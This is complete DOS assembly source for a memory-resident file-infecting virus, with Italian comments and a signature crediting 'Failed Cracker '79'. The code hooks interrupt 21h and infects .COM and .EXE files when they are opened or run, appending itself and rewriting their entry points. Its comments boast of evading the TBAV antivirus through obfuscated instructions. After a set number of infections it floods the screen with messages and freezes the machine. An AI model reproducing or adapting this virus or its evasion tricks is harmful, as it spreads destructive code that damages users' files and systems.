attrpd equ 143       ;Attributo della scritta a schermo pieno. Ora ä bianco luminoso lampeggiante.
numpres equ 20       ;Numero di esecuzioni/aperture files prima che venga visualizzata la prima stringa.
numinfezioniperpd equ 50    ;Numero di infezioni mancate prima che venga visualizzata la scritta a schermo pieno.
%out Versione base del virus con sostituzione int21h con chiamata far. La data per il controllo infezione ä 12/06/80.
%out Ho fottuto il TBAV!!!
%out Impedisce l'infezione del COMMAND.COM
%out Impedisce l'infezione di files .exe maggiori di 524287 bytes. Problemi di allocazione.
%out Scrive una stringa ogni numpres caricamenti di eseguibili.
%out Riempie lo schermo di scritte poco ortodosse dopo numinfezioniperpd-1 infezioni e si blocca
%out
%out HURRA'!!!!!!!!!!1
%out Risolti problemi di memoria. Occorre sempre mettere in MCB:[1] il segmento PSP (cioä MCB+1).
%out Inoltre ä opportuno che si crei un nuovo PSP per tale segmento, poichä di per sä non esiste ancora.
%out Per la prima volta ci sono dei commenti !!!
%out Controllo attributi.
.286
viruspage equ (offset go-offset vai)/16+1    ;Dimensione del virus in pagine
code segment
assume cs:code,ds:code
org 100h

vai: jmp go         ;Salta al Memory resident code. Tale codice non verrÖ mai pió eseguito.
valore db 00        ;Valore che conta il numero di volte che viene eseguito o aperto un file eseguibile. Serve per la prima stringa.
valinf db 00        ;Valore che conta il numero di files infetti. Serve per stabilire quando bloccare il sistema.
flagcom db 0        ;Flag per stabilire se il file ä .com o .exe. Nella main verrÖ utilizzata per stabilire se occorre ricostruire l'entry point (nel caso di un .com)

oldcall dd 00       ;Vecchia chiamata int 21h
segm dw 00          ;Vecchio segmento int 21h
offs dw 00          ;Vecchio offset int 21h. Queste due ultime informazioni sarebbero giÖ presenti in oldcall. Solo per comoditÖ.
oldcs dw 00         ;Word per salvare il vecchio ds all'entry point del virus.

main:               ;QUI INIZIA L'ENTRY POINT DEL VIRUS. Nel caso dei .com, vi sarÖ prima una procedura per saltarvici.
push ds             ;Salva ds
pop cs:oldcs
push es
push ds
mov dx,1234h        
mov ah,30h
int 21h             ;Questo servizio esiste...
cmp dx,5678h        ;ma non restituisce di certo 5678h in dx. E' un modo per controllare se il virus ä in memoria.
jz finemain         ;Se dx=5678h il virus ä in memoria. Si puï tornare al file originale.
xor ax,ax           
sub ax,3521h
neg ax              ;Tutti questi conti servono per scrivere qualcosa come 'mov ax,3521h'. In tal modo evito i controlli del Tbav.
int 21h             ;Ottengo il vettore int 21h.
mov cs:offs,bx      ;Salvo il vecchio int 21h
mov cs:word ptr oldcall,bx
push es
pop cs:segm
push es
pop cs:word ptr oldcall[2]
mov ax,ds
dec ax
mov es,ax           ;l'MCB di un segmento X si trova a X-1:0. Quindi ora es contiene l'MCB del mio segmento dati.
mov bx,es:[3]       ;Ottengo la memoria allocata per tale segmento.
sub bx,viruspage+10h ;Tolgo le dimensioni del virus+psp.
push ds
pop es
mov ah,4ah
int 21h             ;Ora il mio segmento dati ä pió piccolo. L'MCB ha registrato tale informazione. Ora ho a disposizione tale memoria liberata (viruspage+10h).
mov bx,viruspage+0fh
mov ah,48h          ;Alloco la memoria libera in un nuovo segmento.
int 21h
mov es,ax
mov dx,ax           
mov ah,26h          ;Costruisco un nuovo PSP per il mio segmento. In tal modo ho la certezza che il virus in memoria non venga riconosciuto come file infetto in memoria.
int 21h             ;Inoltre in tal modo elimino l'eventuale blocco del sistema (che deve essere comunque SEMPRE controllato).
mov ax,es
dec ax
mov es,ax           ;Metto l'MCB del nuovo segmento in es. Esso esisteva giÖ al momento della creazione del segmento, ma alla posizione MCB:[2] vi era il segmento del programma, non del nuovo psp.
inc ax
mov es:[1],ax       ;Ora il mio psp ä registrato nell'MCB del nuovo segmento.
push cs
pop ds
mov di,100h
mov si,di
cld
mov cx,(offset go-offset vai)
mov cs:valore,0        ;Inizializzazione variabili.
mov cs:valinf,0
rep movsb           ;Copio il virus nella nuova area di memoria.
push es
pop ds
xor ax,ax
sub ax,2521h
neg ax              ;mov ax,2521h. Abbasso TBAV !
mov dx,offset start21
int 21h             ;Catturo l'int 21h.
finemain:
cmp cs:flagcom,0    ;Il file ä .com ?
jz nonecom          ;se no, salta.
push cs:oldcs       ;es=ds
pop es
mov di,100h
mov si,offset oldint
push cs
pop ds
mov cx,12
cld
rep movsb           ;Ripristina il vecchio entry point del file
nonecom:
pop ds
pop es
m1 db 0b8h          ;B8h ä il codice esadecimale di mov ax,_____
mainseg dw 00       ;Segmento di ritorno calcolato in base alla posizione fisica all'interno del file. Ad esso si sommerÖ il ds iniziale.
mov bx,ds           ;N.B. Ovviamente, dal momento che nei .com occorre tornare all'inizio del file, tale valore sarÖ 0, in questo caso.
add ax,bx
push ax             ;Metto il cs calcolato nello stack.
m2 db 68h           ;68h ä il codice esadecimale di push ____. Pare che il Tbav non lo conosca e ciï ha decretato la sua sconfitta. HAHAHA!
mainoff dw 00       ;Metto l'offset calcolato nello stack.
retf                ;Torno all'entry point originale.

oldint db 12 dup (00)  ;Intestazione originale dei .com

header:             ;Intestazione dei .exe.
MZ dw 0
lenght_image_512 dw 00  ;Lunghezza del file.
lenght_file_512 dw 00   ;Lunghezza del file.
relitems dw 00
sizheader dw 00
minmem dw 00            ;Memoria minima allocata per il file.
maxmem dw 00            ;Memoria massima allocata per il file.
stack_segment dw 00
stack_offset dw 00
checksum dw 00
entry_point_ip dw 00    ;Entry point IP del file. Esso verrÖ sostituito con l'entry point del virus.
entry_point_cs dw 00    ;Entry point CS del file. Esso verrÖ sostituito con quello del virus. Esso viene scelto in modo che IP=offset main, cosç che nessuna word perda la propria posizione.
endheader:

setdim proc             ;Procedura per calcolare le nuove dimensioni del file .exe. Tale informazione occorre per aggiornare l'header.
mov ax,viruspage
dec ax
shl ax,4                ;Ottengo la lunghezza del virus in bytes.
add ax,lenght_image_512 ;Sommo il resto della divisione tra la lunghezza del file e 512 (lenght_file_512 ä dimensione file div 512, il resto ä in lenght_image_512).
loop512:
cmp ax,512
jb hofinito
inc lenght_file_512
sub ax,512
jmp loop512             ;A tale valore tolgo 512 finchä non viene negativo ed incremento man mano lenght_file_512.
hofinito:
mov lenght_image_512,ax ;Salvo le modifiche.
ret
endp setdim

oldseg dw 00
olddx dw 00
oldattr dw 00

setattr proc
push dx
pop cs:olddx
push ds
pop cs:oldseg
mov ax,4300h
int 21h
mov cs:oldattr,cx
mov ax,4301h
mov cx,0
int 21h
ret
endp setattr

restattr proc
push cs:olddx
pop dx
push cs:oldseg
pop ds
mov cx,cs:oldattr
mov ax,4301h
int 21h
ret
endp restattr

infexe proc             ;Procedura d'infezione dei files .exe
mov cs:flagcom,0        ;E' un file .exe, dunque il flagcom=0.
call setattr            ;Modifica gli attributi del file.
call openfile           ;Apro il file.
jnb exeinf              ;Se c'ä un errore, termina.
jmp noexeinf
exeinf:
call checkinf           ;Controlla se ä infetto.
jb noexeinf             ;Se ä giÖ infetto, termina.
push cs
pop ds
call azzerapoint        ;Azzera il puntatore lettura/scrittura.
xor ax,ax
sub al,3fh
neg al
mov ah,al               ;mov ah,3fh
mov cx,offset endheader-offset header
mov dx,offset header
pushf
call cs:oldcall         ;D'ora in poi, tutti i call cs:oldcall=int 21h. E' un modo per confondere TBAV.
call setdim             ;Aggiorna le dimensioni del file nell'header. 
add minmem,viruspage+10h  ;Aumento la memoria necessaria all'eseguibile della dimensione del virus.
cmp maxmem,0ffffh-(viruspage+34fh)
jnb nonsommare          ;Se sommando viene negativo, meglio non sommare.
add maxmem,viruspage+10h
nonsommare:
mov ax,entry_point_ip
mov mainoff,ax          ;Salva gli indirizzi di ritorno. Vedi sopra, alla fine del main.
mov ax,entry_point_cs
add ax,10h              ;Il segmento ds, negli .exe non tiene conto del PSP. Sommando 10h pagine (cioä 100h bytes) ci posizioniamo all'inizio del file.
                        ;La somma di ds+10h+segmento nell'header costituiscono la pagina di memoria in cui il codice dell'entry point verrÖ rilocato.
mov mainseg,ax          ;Salva tale segmento.
call arrotonda          ;Arrotondo la dimensione del file in eccesso alla pagina successiva. Ciï ä necessario, se voglio spostare il mio codice in fondo al file e conservare IP, dal momento che i segmenti vanno di 16 bytes in 16 bytes.
call getcs_100          ;Ottengo il segmento necessario per avere all'entry point un IP=offset main.
cmp ax,8000h            ;Se il file ä troppo grande, non lo infetta, perchä la rilocazione andrebbe a male. Si tratta, in genere, di files che leggono i dati non allocati (es. archivi self-extract o pmode files).
jnb noexeinf            ;Se ä troppo grande, non infettare.
sub ax,10h              ;La rilocazione funziona cosç: cs dell'entry point=ds+10h(psp)+dimensioni header. Facendo il contrario, mettiamo l'esatto valore nell'header.
sub ax,sizheader
mov entry_point_cs,ax   ;Salvo il cs_entrypoint.
mov entry_point_ip,offset main  ;Ora sono sicuro che il mio ip_entrypoint ä uguale all'offset del main.
call azzerapoint        ;Azzero il puntatore lettura-scrittura.
xor ax,ax               
sub al,40h
neg al
mov ah,al               ;mov ah,40h.
mov cx,offset endheader-offset header
mov dx,offset header
pushf
call cs:oldcall         ;Scrivi le modifiche apportate all'header.
call writeall           ;Scrivi il grosso del virus.
call setinf             ;Contrassegna il file con la data 12/06/80. Essa non ä errata, ma mi permette di riconoscere i files giÖ infetti.
noexeinf:
xor ax,ax
sub al,3eh
neg al
mov ah,al               ;mov ah,3eh.
pushf
call cs:oldcall         ;Chiudi il file.
call restattr           ;Ripristina gli attributi del file.
ret
endp infexe

checkcommand proc       ;Procedura che controlla se il file da infettare ä il command.com.
push ax
push cx
push si
push di
push es
pushf

push ds
pop es
mov di,dx
cld
mov al,0
mov cx,128
repnz scasb             ;Cerca la fine della stringa in cui ä contenuto il nome del file.
dec di
dec di
mov si,di
mov di,offset finecommand-1
loopcommand:
std
lodsb                   ;Carica un byte dalla stringa del file.
call maiusc             ;Rende tale carattere maiuscolo.
mov ah,cs:[di]          ;Confronto con la mia stringa in memoria
inc al
cmp ah,al
jnz nocommand           ;Se i due valori sono diversi, non si tratta del command.com. Posso infettare.
dec di
cmp di,offset command
jnb loopcommand         ;Continua fino alla fine della stringa.

popf
pop es
pop di
pop si
pop cx
pop ax
stc                     ;Errore. Si tratta del command. Non infettare !
ret
nocommand:
popf
pop es
pop di
pop si
pop cx
pop ax
clc                     ;Via libera per l'infezione.
ret
endp checkcommand

infcom proc             ;Procedura per l'infezione di un file .com
call checkcommand       ;Controllo se il file ä command.com
jb noinf                ;Se lo ä, non infettare.
call setattr            ;Modifica gli attributi del file.
mov cs:flagcom,1        ;Trattandosi di un .com, il flagcom=1.
call openfile           ;Apro il file.
jb noinf                ;In caso di errore, esce.
call checkinf           ;Controllo se il file ä infetto.
jb noinf                ;Se lo ä, esci.
push cs
pop ds
call azzerapoint        ;Azzera il puntatore lettura-scrittura.
xor ax,ax
sub al,3fh
neg al
mov ah,al               ;mov ah,3fh
mov cx,12
mov dx,offset oldint
pushf
call cs:oldcall         ;Legge i primi bytes del file.
call arrotonda          ;Arrotonda le dimensioni del file alla pagina di memoria superiore. Il motivo ä lo stesso che per i .exe
call getcs_100          ;Ottieni il segmento per il salto al virus.
mov segcom,ax
call azzerapoint        ;Azzera il puntatore.
xor ax,ax
sub al,40h
neg al
mov ah,al               ;mov ah,40h.
mov cx,12
mov dx,offset iniziocom
pushf
call cs:oldcall         ;Scrive i primi bytes del .com. Essi sono responsabili del salto al virus, in fondo al file.
mov mainseg,0           ;Trattandosi di un .com, il segmento iniziale per il ritorno, almeno rispetto alla posizione fisica del file, ä 0, cioä all'inizio del file.
mov mainoff,100h        ;IP ä 100h, per via del PSP.
call writeall           ;Scrivo il grosso del virus.
call setinf
noinf:
xor ax,ax
sub al,3eh
neg al
mov ah,al               ;mov ah,3eh.
pushf
call cs:oldcall         ;Chiudo il file.
call restattr           ;Ripristino attributi file.
ret
endp infcom

viewstring proc
loopview:
cld
lodsb
cmp al,0
jz finitoview
stosb
mov al,attrpd
stosb
jmp loopview
finitoview:
ret
endp viewstring

aspetta proc
mov ah,86h
mov cx,1eh
mov dx,8480h
int 15h
ret
endp aspetta

beep proc
mov ah,2
mov dl,7
int 21h
ret
endp beep

checkinf proc           ;Controllo infezione di un file.
xor ax,ax
sub ax,5700h
neg ax
pushf
call cs:oldcall         ;Ottengo la data di modifica del file.
cmp cx,0
jnz tifotterï           ;Se essa ä 12/06/80 alle ore 12.00...
cmp dx,0cch
jnz tifotterï
inc valinf              ;Incrementa valinf.
cmp valinf,numinfezioniperpd  ;Se tale valore supera la soglia...
jb finish
push cs
pop ds
push 0b800h
pop es
mov ax,3
int 10h
mov bh,0
mov ah,9
mov bl,attrpd
mov cx,10
mov al,0
int 10h
mov si,offset mess1
mov di,40
call viewstring
call beep
call aspetta
mov si,offset mess2
mov di,360
call viewstring
call beep
call aspetta
mov si,offset mess3
mov di,680
call viewstring
call beep
call aspetta
mov si,offset mess4
mov di,1000
call viewstring
call beep
call aspetta
call aspetta
mov si,offset mess5
mov di,1500
call viewstring
blocca:
mov al,3
out 61h,al
cli
hlt                     ;e blocca il sistema.
finish:                 ;...altrimenti segnala che il file non ä infettabile.
stc
ret
tifotterï:              ;Qui si arriva se il file puï essere infettato.
clc
ret
endp checkinf

setinf proc             ;Setta la data in modo tale che ora il virus ä riconosciuto come infetto.
xor ax,ax
sub ax,5701h
neg ax
;;mov ax,5701h
mov cx,0
mov dx,0cch
pushf
call cs:oldcall         ;12/06/80, alle ore 12.00
ret
endp setinf

openfile proc           ;Procedura di apertura file.
xor ax,ax
sub ax,3d02h
neg ax                  ;Mov ax,3d02h.
pushf
call cs:oldcall
mov bx,ax               ;Restituisce l'handle in bx.
ret
endp openfile

writestring proc        ;Procedura di scrittura stringa di presentazione.
pusha
push ds
push cs
pop ds
inc valore
cmp valore,numpres      ;Solo una volta ogni numpress...
jb nostring
mov valore,0
mov ah,9                ;...viene visualizzata una stringa.
mov dx,offset stringa
int 21h
nostring:
pop ds
popa
ret
endp writestring

arrotonda proc          ;Procedura per arrotondare un file alla successiva pagina.
xor ax,ax
sub ax,4202h
neg ax                  ;Mov ax,4202h.
xor cx,cx
xor dx,dx
pushf
call cs:oldcall         ;Mette il puntatore alla fine del file.
mov cx,ax
and cx,1111111111110000b
add cx,10h
sub cx,ax               ;Arrotonda il numero cx:ax alla pagina successiva. Per controlli precedenti esso non supera i 16 bits.
xor ax,ax
sub al,40h
neg al
mov ah,al               ;mov ah,40h.
pushf
call cs:oldcall         ;Scrive la zavorra necessaria.
xor ax,ax
sub ax,4202h
neg ax                  ;Mov ax,4202h
xor cx,cx
xor dx,dx
pushf
call cs:oldcall         ;Posiziona il puntatore lettura-scrittura alla fine.
ret
endp arrotonda

azzerapoint proc        ;Azzera il puntatore lettura-scrittura.
xor ax,ax
sub ax,4200h
neg ax                  ;mov ax,4200h
xor cx,cx
xor dx,dx
pushf
call cs:oldcall         ;Azzeramento.
ret
endp azzerapoint

getcs_100 proc          ;Ottieni il segmento dell'entry point necessario per avere un ip pari all'offset main.
xor ax,ax
sub ax,4202h
neg ax                  ;Mov ax,4202h.
xor cx,cx
xor dx,dx
pushf
call cs:oldcall         ;Sposta il puntatore lettura-scrittura alla fine. In dx:ax ho la dimensione del file.
and dl,00001111b
shl dl,4
shr ax,4
add ah,dl               ;Effettua uno shift a sinistra del numero dx:ax. Tale valore, per controlli precedenti sulla dimensione del file, non supera i 16 bit.
ret
endp getcs_100

data db 90 dup (00)
mess1 db "Life is Illusion",0
mess2 db "Destroy Irresolution",0
mess3 db "Tears Are so Hard",0
mess4 db "Put Your PC in a",0
mess5 db "G R A V E Y A R D",0
stringa db "Anti-God. Development by Failed Cracker '79 the Worst -IT-$"
command db "C"+1,"O"+1,"M"+1,"M"+1,"A"+1,"N"+1,"D"+1,"."+1,"C"+1,"O"+1,"M"+1
finecommand:
writeall proc           ;Procedura di scrittura del grosso del file
xor ax,ax
sub ax,4202h
neg ax                  ;Mov ax,4202h.
xor cx,cx
xor dx,dx
int 21h                 ;Posiziona il puntatore lettura-scrittura alla fine.
xor ax,ax
sub al,40h
neg al
mov ah,al               ;mov ah,40h.
mov cx,offset go-offset vai
mov dx,offset vai
pushf
call cs:oldcall         ;Scrive tutto il virus in fondo al file
ret
endp writeall

iniziocom:              ;Intestazione dei files .com.
p1 db 0b8h              ;Mov ax,____
segcom dw 00            ;Segmento di salto al virus.
mov bx,ds               ;Esso va sommato col segmento base di allocazione.
add ax,bx
push ax                 ;Lo metto nello stack.
push offset main        ;Prendo l'offset main.
retf                    ;Salto al virus.
fineiniziocom:

maiusc proc             ;Procedura per trasformare in maiuscolo un carattere.
cmp al,90               ;Il carattere ä passato in al.
jna nomaiusc
sub al,32
nomaiusc:
ret                     ;Il risultato ä dato in al.
endp maiusc

start21:
pushf
cmp ah,30h              ;Controlla se viene richiesto un controllo di attivazione virus.
jnz cont666
cmp dx,1234h
jnz cont666
mov ah,30h
pushf
call cs:oldcall
mov dx,5678h            ;Se attivo, il virus restituisce, alla chiamata 30h, il valore 5678h in dx.
popf
iret                    
cont666:
push ax
sub ah,3dh              ;Controllo apertura files.
cmp ah,0
pop ax
jz vabene
push ax
sub ah,4bh              ;Controllo caricamento files.
cmp ah,0
pop ax
jnz fine
vabene:
pusha
push ds
push es
push ds
pop es
mov di,dx
cld
mov al,0
mov cx,128
repnz scasb             ;Ricerca il carattere 00, fine della stringa del nome file.
mov si,di
dec si
dec si                  ;quindi si posiziona sull'ultimo carattere dell'eventuale estensione.
std
push si
lodsb
call maiusc
cmp al,"M"
jnz exe
lodsb
call maiusc
cmp al,"O"
jnz exe
lodsb
call maiusc
cmp al,"C"
jnz exe
call writestring        ;Se ä un .com, effettua il controllo per scrivere eventualmente la stringa.
call infcom             ;Quindi infetta il .com.
pop si
jmp fine2               ;Salta al vecchio int 21h.
exe:
pop si
lodsb
call maiusc
cmp al,"E"
jnz fine2
lodsb
call maiusc
cmp al,"X"
jnz fine2
lodsb
call maiusc
cmp al,"E"
jnz fine2
call writestring        ;Se ä un .exe, effettua il controllo per scrivere eventualmente la stringa.
call infexe             ;Quindi infetta il file .exe.
fine2:
pop es
pop ds
popa
fine:
popf
push cs:segm
push cs:offs
retf                    ;Ritorno al vecchio interrupt.

go:
mov valore,0
mov valinf,0
mov ax,3521h
int 21h
mov cs:word ptr oldcall,bx
mov offs,bx
push es
pop segm
push es
pop cs:word ptr oldcall[2]
mov ax,2521h
mov dx,offset start21
int 21h
mov dx,offset go
int 27h
ends code
end vai
